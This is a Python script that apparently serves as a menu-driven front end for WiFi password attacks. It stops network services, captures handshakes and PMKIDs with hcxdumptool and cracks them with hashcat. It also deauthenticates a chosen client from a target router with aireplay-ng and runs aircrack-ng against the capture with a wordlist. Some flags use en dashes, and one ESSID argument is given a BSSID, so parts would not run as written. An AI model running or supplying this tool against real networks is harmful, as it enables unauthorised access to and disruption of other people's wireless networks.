import subprocess

logo = '''
     -------------------------------------------
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █ ▄▀▄ █ ████▀ ██ ▄▄ █▀▄▀█ ██ █ ▄▄▀█ ▄▄█ ▄▄▀
    █ █▄█ █ ▄▄ ██ ████▄▀█ █▀█ ▀▀ █ ▄▄▀█ ▄▄█ ▀▀▄
    █▄███▄█▄██▄█▀ ▀█ ▀▀ ██▄██▀▀▀▄█▄▄▄▄█▄▄▄█▄█▄▄
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    --------------------------------------------
'''

print(logo)


def check_tool_installed(tool_name):
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False


def check_tools():
    required_tools = ["sudo", "hcxdumptool", "hcxpcapngtool", "hashcat", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing_tools = []

    for tool in required_tools:
        if not check_tool_installed(tool):
            missing_tools.append(tool)

    if len(missing_tools) == 0:
        print("All required tools are installed.")
    else:
        print("The following tools are missing:")
        for tool in missing_tools:
            print(tool)


def stop_services():
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager.service"])
    subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant.service"])
    print(logo)


def start_services():
    subprocess.run(["sudo", "systemctl", "start", "wpa_supplicant.service"])
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager.service"])
    print(logo)


def run_hcxdumptool(interface, dumpfile):
    subprocess.run(["sudo", "hcxdumptool", "-i", interface, "-o", dumpfile, "–active_beacon", "–enable_status=15"])


def run_hcxpcapngtool(input_file, output_file, wordlist):
    subprocess.run(["hcxpcapngtool", "-o", output_file, "-E", "essidlist", input_file])
    subprocess.run(["hashcat", "-m", "22000", output_file, wordlist])


def run_airodump_ng(interface, router_channel, target_router, fname, target_device, wordlist):
    subprocess.run(["airmon-ng", "start", interface])
    subprocess.Popen(["airodump-ng", interface])
    subprocess.Popen(["airodump-ng", "-c", router_channel, "--bssid", target_router, "-w", fname, interface])
    subprocess.Popen(["aireplay-ng", "-0", "1", "-a", target_router, "-c", target_device, interface])
    subprocess.Popen(["aircrack-ng", "-w", wordlist, "-b", target_router, fname + ".cap", "-e", target_router])


def run_airodump_ng_simple(interface):
    subprocess.run(["airodump-ng", interface])


def main_menu():
    print("1. Run hcxdumptool")
    print("2. Run hcxpcapngtool")
    print("3. Run airodump-ng (advanced)")
    print("4. Quit")
    option = input("Enter your option: ")
    return option


def hcxdumptool_menu():
    interface = input("Enter the interface: ")
    dumpfile = input("Enter the name of the dump file: ")
    stop_services()
    run_hcxdumptool(interface, dumpfile)
    start_services()


def hcxpcapngtool_menu():
    input_file = input("Enter the name of the input file: ")
    output_file = input("Enter the name of the output file: ")
    wordlist = input("Enter the name of the wordlist: ")
    run_hcxpcapngtool(input_file, output_file, wordlist)


def airodump_ng_menu():
    interface = input("Enter the interface: ")
    router_channel = input("Enter the channel of the target router: ")
    target_router = input("Enter the BSSID of the target router: ")
    fname = input("Enter the name for the output capture file: ")
    target_device = input("Enter the MAC address of the target device: ")
    wordlist = input("Enter the name of the wordlist: ")
    stop_services()
    run_airodump_ng(interface, router_channel, target_router, fname, target_device, wordlist)
    start_services()


def main():
    check_tools()

    while True:
        option = main_menu()
        if option == "1":
            hcxdumptool_menu()
        elif option == "2":
            hcxpcapngtool_menu()
        elif option == "3":
            airodump_ng_menu()
        elif option == "4":
            break


if __name__ == "__main__":
    main()
